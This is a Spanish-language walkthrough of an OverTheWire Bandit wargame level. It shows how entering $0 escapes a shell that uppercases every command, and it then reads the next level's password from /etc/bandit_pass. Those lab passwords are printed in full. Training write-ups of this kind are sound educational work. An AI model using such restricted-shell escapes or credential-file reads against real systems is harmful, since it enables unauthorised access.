# Level 32 to Level 33

## Objetivo
After all this `git` stuff its time for another escape. Good luck!

## Datos de acceso al nivel
Host: bandit.labs.overthewire.org  
Port: 2220
Username: bandit32
Password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
```bash
ssh bandit32@bandit.labs.overthewire.org -p 2220
```



## Solución
Al entrar nos damos cuenta que no es un shell normal, sino que todas las entradas las transforma a mayúsculas. Introducimos $0 para iniciar un shell sh y ejecutar comandos normalmente.
```
>> ls -la
sh: 1: LS: not found
>> $0
$ whoami
bandit33
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Feb 21 22:03 .
drwxr-xr-x 70 root     root      4096 Feb 21 22:04 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Feb 21 22:03 uppershell
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
$
```

## Notas adicionales


## Referencias

